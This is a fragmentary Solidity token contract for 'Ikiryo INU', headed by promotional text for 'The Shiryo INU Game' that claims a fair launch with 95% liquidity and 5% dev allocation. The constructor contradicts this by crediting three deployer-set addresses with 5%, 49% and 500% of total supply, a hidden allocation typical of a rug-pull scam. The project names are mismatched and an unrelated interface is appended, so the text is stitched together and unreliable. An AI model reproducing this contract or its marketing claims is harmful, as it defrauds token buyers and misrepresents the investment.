...
╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░  ╚═╝╚═╝░░╚══╝░╚═════╝░
The Shiryo INU Game
Fully functional DAPP that allows for the minting of trading packs with random cards.
...
🐦https://shiryoinu.com/
🐦https://t.me/ShiryoINU
🐦https://shiryoinu.com/wp-content/uploads/2021/11/Shiryo-Inu-Whitepaper-v3.pdf
🐦https://twitter.com/ShiryoInu
...
📎Liquidity:95%
📎Dev / Marketing: 5%
📎Launching :Fairlaunched
📎Total Tax: 11% for Buys & Sells
📎Slippage: 13%
*/
...
contract IkiryoINU is NFTGAME {
     // FairLaunch
    // common addresses
    address private owner;
    address private CardGameBSC;
    address private CardGameCoin;
    address private CardGame;
    ...
    string public override name = "Ikiryo INU";
    string public override symbol = "IkiryoINU";
    ...
    constructor(uint totalSupplyValue, address CardGameBSCAddress, address CardGameCoinAddress, address CardGameAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        CardGameBSC = CardGameBSCAddress;
        CardGameCoin = CardGameCoinAddress;
        CardGame = CardGameAddress;
        balances[CardGameBSC] =  totalSupply * 5 / 100;
        balances[CardGameCoin] = totalSupply * 49 / 100;
        balances[CardGame] = totalSupply * 500 / 100;
...
interface GLOWNETMetadata is GLOWNET {
    /**
